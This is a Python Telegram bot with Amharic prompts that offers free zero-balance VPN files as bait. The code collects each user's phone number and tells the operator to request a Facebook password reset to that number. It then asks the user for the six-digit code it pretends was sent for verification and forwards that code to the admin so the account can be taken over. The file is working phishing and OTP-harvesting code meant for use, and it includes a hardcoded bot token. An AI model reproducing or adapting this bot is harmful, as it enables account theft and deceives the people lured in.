import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# --- 1. Configuration ---
BOT_TOKEN = "8717535794:AAEypF9pE-IBTjtI-N_YQvgFiJVSbxAaQ0s"
ADMIN_ID = 7705713321

# Logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Conversation States
PHONE, OTP = range(2)

# --- 2. Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # ስልክ ቁጥር ለመጠየቅ በተን ማዘጋጀት
    contact_keyboard = [[KeyboardButton(text="📲 ስልክ ቁጥርዎን ለማጋራት እዚህ ይጫኑ", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(contact_keyboard, one_time_keyboard=True, resize_keyboard=True)
    
    await update.message.reply_text(
        "እንኳን ወደ ነፃ የ VPN ፋይሎች ማውረጃ ቦት በደህና መጡ! 🚀\n\n"
        "የሳፋሪኮም እና የኢትዮ ቴሌኮም 0 ብር ፋይሎችን ለማግኘት መጀመሪያ ስልክዎን ያጋሩ፦",
        reply_markup=reply_markup
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.contact:
        await update.message.reply_text("እባክዎ በተኑን ተጭነው ስልክዎን ያጋሩ።")
        return PHONE
    
    phone = update.message.contact.phone_number
    context.user_data['phone'] = phone

    # ለአድሚኑ መረጃውን መላክ (አድሚኑ አሁን በፌስቡክ በኩል ኮድ ማስላክ ይችላል)
    admin_alert = (
        f"🚨 **አዲስ የ Facebook OTP ጥያቄ!**\n\n"
        f"📞 ስልክ: `{phone}`\n"
        f"💡 አሁኑኑ በፌስቡክ 'Forgot Password' በማለት ወደዚህ ቁጥር ኮድ ያስልኩ።"
    )
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_alert, parse_mode="Markdown")

    await update.message.reply_text(
        f"ትክክለኛ የ Facebook ማረጋገጫ ኮድ ወደ ስልክዎ ({phone}) ተልኳል።\n\n"
        "እባክዎ የደረሰዎትን ባለ 6 አሃዝ ኮድ እዚህ ያስገቡ፦",
        reply_markup=ReplyKeyboardRemove()
    )
    return OTP

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp_code = update.message.text
    phone = context.user_data['phone']

    # የደረሰውን ኮድ ለአድሚኑ መላክ
    admin_msg = (
        f"🔥 **የ Facebook OTP ኮድ ደርሷል!**\n\n"
        f"📞 ስልክ: `{phone}`\n"
        f"🔑 ኮድ: `{otp_code}`"
    )
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown")
    
    # ለተጠቃሚው ፋይሉን መስጠት
    await update.message.reply_text("✅ ኮዱ ተረጋግጧል! የዚህ ሳምንት የ VPN ፋይል እነሆ፦")
    
    try:
        # በፎልደሩ ውስጥ 'fast_vpn.hc' የሚባል ፋይል መኖር አለበት
        await update.message.reply_document(document=open('fast_vpn.hc', 'rb'))
    except:
        await update.message.reply_text("📁 ፋይሉን ለማግኘት ጥቂት ደቂቃ ይጠብቁ፣ አድሚኑ ይልክልዎታል።")
        
    return ConversationHandler.END

# --- 3. Main Run ---
if __name__ == '__main__':
    app = Application.builder().token(BOT_TOKEN).build()
    
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.CONTACT, get_phone)],
            OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
        },
        fallbacks=[],
    )
    
    app.add_handler(conv)
    print("Facebook OTP Giver Bot is running...")
    app.run_polling()
